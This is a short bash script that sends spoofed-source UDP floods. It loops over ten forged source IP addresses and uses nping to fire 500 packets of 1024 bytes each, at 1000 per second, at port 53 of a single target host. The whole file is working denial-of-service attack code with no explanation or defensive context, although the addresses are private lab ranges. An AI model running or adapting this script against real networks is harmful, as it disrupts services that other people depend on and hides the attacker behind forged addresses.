#!/bin/bash

# Define the range of IPs to spoof
START_IP=192.168.2.1
END_IP=192.168.2.10
TARGET_IP=192.168.1.4
PORT=53
DATA_STRING=$(printf '%*s' 1024 'A')
COUNT=500
RATE=1000

# Convert IPs to integers for iteration
ip_to_int() {
    local IFS=.
    read -r i1 i2 i3 i4 <<< "$1"
    echo $((i1 * 256**3 + i2 * 256**2 + i3 * 256 + i4))
}

int_to_ip() {
    local int=$1
    local i1=$((int / 256**3 % 256))
    local i2=$((int / 256**2 % 256))
    local i3=$((int / 256 % 256))
    local i4=$((int % 256))
    echo "$i1.$i2.$i3.$i4"
}

# Loop through the range of IPs
START=$(ip_to_int "$START_IP")
END=$(ip_to_int "$END_IP")

for ((i = START; i <= END; i++)); do
    SPOOFED_IP=$(int_to_ip "$i")
    sudo nping --udp -p $PORT --data-string "$DATA_STRING" --source-ip "$SPOOFED_IP" --count $COUNT --rate $RATE $TARGET_IP
done
